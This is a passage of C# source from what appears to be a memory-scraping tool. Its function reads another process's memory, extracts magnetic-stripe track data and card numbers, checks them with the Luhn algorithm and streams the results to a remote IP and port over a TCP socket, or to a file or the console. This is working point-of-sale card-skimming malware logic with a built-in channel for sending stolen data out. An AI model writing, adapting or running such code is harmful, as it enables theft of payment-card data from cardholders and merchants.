        // MSdata search run mode
        // Identfies magnetic stripe track data (track 1 and track 2, not track 3)
        public static void memScanMSData(CliArgs myargs)
        {
            IPAddress ipAddress;
            IPEndPoint remoteIP;
            Socket sender = null;
            System.IO.StreamWriter file = null;
            Regex rgx = new Regex(TRACKREGEX); // regex pattern to match
            ISet<String> capturedTracks = new HashSet<String>();

            // writing output to socket
            if (myargs.mode.Equals("socket"))
            {
                try
                {
                    ipAddress = IPAddress.Parse(myargs.ipaddr);
                    remoteIP = new IPEndPoint(ipAddress, myargs.portnum);
                    sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    sender.Connect(remoteIP);
                    Console.WriteLine("Socket connected to {0}", sender.RemoteEndPoint.ToString());
                }
                catch (SocketException se)
                {
                    Console.WriteLine("SocketException : {0}", se.ToString());
                }
            }

            // writing output to file
            if (myargs.mode.Equals("file"))
            {
                file = new System.IO.StreamWriter(myargs.filename);
                file.AutoFlush = true;
            }

            // to infinity, and beyond!
            while (true)
            {
                // getting minimum & maximum address
                SYSTEM_INFO sys_info = new SYSTEM_INFO();
                GetSystemInfo(out sys_info);

                IntPtr proc_min_address = sys_info.minimumApplicationAddress;
                IntPtr proc_max_address = sys_info.maximumApplicationAddress;

                // saving the values as long ints to avoid  lot of casts later
                long proc_min_address_l = (long)proc_min_address;
                long proc_max_address_l = (long)proc_max_address;

                String toSend = "";

                // opening the process with desired access level
                IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_WM_READ, false, process.Id);

                // this will store any information we get from VirtualQueryEx()
                MEMORY_BASIC_INFORMATION mem_basic_info = new MEMORY_BASIC_INFORMATION();

                // number of bytes read with ReadProcessMemory
                int bytesRead = 0;

                // for some efficiencies, pre-compute prepostfix values
                int postfix = myargs.searchterm.Length + (myargs.prepostfix * 2);

                while (proc_min_address_l < proc_max_address_l)
                {
                    // 28 = sizeof(MEMORY_BASIC_INFORMATION)
                    VirtualQueryEx(processHandle, proc_min_address, out mem_basic_info, 28);

                    // if this memory chunk is accessible
                    if (mem_basic_info.Protect == PAGE_READWRITE && mem_basic_info.State == MEM_COMMIT)
                    {
                        byte[] buffer = new byte[mem_basic_info.RegionSize];

                        // read everything in the buffer above
                        ReadProcessMemory((int)processHandle, mem_basic_info.BaseAddress, buffer, mem_basic_info.RegionSize, ref bytesRead);

                        String memStringASCII = Encoding.ASCII.GetString(buffer);
                        String memStringUNICODE = Encoding.Unicode.GetString(buffer);

                        // does the regex pattern exist in this chunk in ASCII form?
                        if (rgx.IsMatch(memStringASCII))
                        {
                            int idex = 0;
                            while (rgx.Match(memStringASCII, idex).Success)
                            {
                                Match match = rgx.Match(memStringASCII, idex);
                                idex = match.Index;
                                int matchLength = match.Length;
                                String potentialTrack = memStringASCII.Substring(idex, matchLength);

                                toSend = potentialTrack;

                                String potentialCC = Regex.Match(potentialTrack, CCREGEX).Value;

                                String potentialCCType = getCCType(potentialCC);
                                toSend += "\n" + potentialCC + "\t(" + potentialCCType + ")\t" + (luhnCheck(potentialCC) ? "\tLuhn check passed\n" : "\tLuhn check failed\n");
                                if (capturedTracks.Add(toSend))
                                {
                                    if (myargs.mode.Equals("socket"))
                                    {
                                        byte[] msg = Encoding.ASCII.GetBytes(toSend);
                                        int bytesSent = sender.Send(msg);
                                    }
                                    if (myargs.mode.Equals("file"))
                                    {
                                        file.WriteLine(toSend);
                                    }
                                    if (myargs.mode.Equals("stdio"))
                                    {
                                        Console.WriteLine(toSend);
                                    }
                                }
                                // enter sandman
                                System.Threading.Thread.Sleep(myargs.delay);
                                idex++;
                            }

                        }

                        // does the regex pattern exist in this chunk in UNICODE form?
                        if (rgx.IsMatch(memStringUNICODE))
                        {

                            int idex = 0;
                            while (rgx.Match(memStringUNICODE, idex).Success)
                            {
                                Match match = rgx.Match(memStringUNICODE, idex);
                                idex = match.Index;
                                int matchLength = match.Length;
                                String potentialTrack = memStringUNICODE.Substring(idex, matchLength);

                                toSend = potentialTrack;

                                String potentialCC = Regex.Match(potentialTrack, CCREGEX).Value;
                                String potentialCCType = getCCType(potentialCC);
                                toSend += "\n" + potentialCC + "\t(" + potentialCCType + ")\t" + (luhnCheck(potentialCC) ? "\tLuhn check passed\n" : "\tLuhn check failed\n");

                                if (capturedTracks.Add(toSend))
                                {
                                    if (myargs.mode.Equals("socket"))
                                    {
                                        byte[] msg = Encoding.ASCII.GetBytes(toSend);
                                        int bytesSent = sender.Send(msg);
                                    }
                                    if (myargs.mode.Equals("file"))
                                    {
                                        file.WriteLine(toSend);
                                    }
                                    if (myargs.mode.Equals("stdio"))
                                    {
                                        Console.WriteLine(toSend);
                                    }
                                }
                                // enter sandman
                                System.Threading.Thread.Sleep(myargs.delay);
                                idex++;
                            }
                        }
                    }
                    // truffle shuffle - moving on chunk
                    proc_min_address_l += mem_basic_info.RegionSize;
                    proc_min_address = new IntPtr(proc_min_address_l);
                }
            }
            // ask Turing if we'll ever get here...
            sender.Shutdown(SocketShutdown.Both);
            sender.Close();
            if (myargs.mode.Equals("file"))
            {
                file.Close();
            }
        }
    }
}
